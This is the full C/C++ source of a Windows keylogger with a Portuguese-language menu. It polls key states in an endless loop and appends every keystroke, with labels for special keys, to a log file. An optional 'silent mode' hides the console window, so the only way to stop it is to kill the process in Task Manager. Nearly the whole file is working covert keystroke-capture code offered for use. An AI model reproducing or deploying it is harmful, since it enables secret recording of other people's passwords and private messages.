#include <stdio.h>
#include <windows.h>
#include <Winuser.h>
#include <string>
#define MAXLINE 15

using namespace std;

int     saveKey(int key, char *file);
void    stealth();

int main(void)
{
    system("mode CON: COLS=90 LINES=30"); //Seta o tamanho do terminal
    system("COLOR 0A");
    system("title WKeylogger");
    int k = 0;
    char fname[MAXLINE];
    char c, i, mode;
    bool keepGoing = true;
    int option;

    while(keepGoing)
    {
        printf("Keylogger [Version 0.1]\n"
               "Desenvolvido por WalterNascimentoBarroso.\n\n"
               "MENU Principal\n"
               "1- Executar o programa\n"
               "2- Sair\n"
               "$: ");
        scanf("%d", &option);
        if(option == 1)
        {
            c = getchar();
            printf("\nExecutando o MENU\n"
                   "Por favor, crie um nome de arquivo de log...\n"
                   "Certifique-se de usar a extens%co '.txt' para "
                   "facilitar o acesso ao arquivo de log\n"
                   "$: ",198);
            while((c = getchar()) != EOF && c != '\n' && k < MAXLINE - 1)
            {
                fname[k] = c;
                ++k;
            }
            fname[k] = '\0';
            printf("Executar o Keylogger em modo silencioso? (s/n): \n"
                   "$: ");
            mode = getchar();
            if(mode == 's')
            {
                printf("Entrando no modo invis%cvel... \n"
                       "Para finalizar o programa, voc%c deve "
                       "matar o processo 'wlogger.exe' \n"
                       "no gerenciador de tarefas do windows!\n"
                       "$: ",161,136);
                system("PAUSE");
                stealth();
            }
            while(true)
            {
                for(i = 8; i < 190; i++)
                {
                    if(GetAsyncKeyState(i) == -32767)
                        saveKey(i, fname);
                }
            }
        }
        else if(option == 2)
        {
            printf("\tAdeus!\n$(logger): ");
            Sleep(1000);
            keepGoing = false;
            return 0;
        }
    }
    return 0;
}

/**
 * Salva a tecla pressionada no arquivo
 */
int saveKey(int key, char *file)
{
    if((key == 1) || (key == 2))
        return 0;

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    if(key == 9)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if(key == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if(key == 16)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if(key == 17)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if(key == 18)
        fprintf(OUTPUT_FILE, "%s", "[ALT]");
    else if(key == 20)
        fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
    else if(key == 27)
        fprintf(OUTPUT_FILE, "%s", "[ESC]");
    else if(key == 32)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if(key == 35)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if(key == 36)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if(key == 37)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if(key == 38)
        fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if(key == 39)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if(key == 40)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if(key == 91)
        fprintf(OUTPUT_FILE, "%s", "[WINDOWS]");
    else if(key == 190 || key == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
    else
        fprintf(OUTPUT_FILE, "%s", &key);

    fclose(OUTPUT_FILE);
    return 0;
}

/* *************************************************************
******************************************************************/

void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
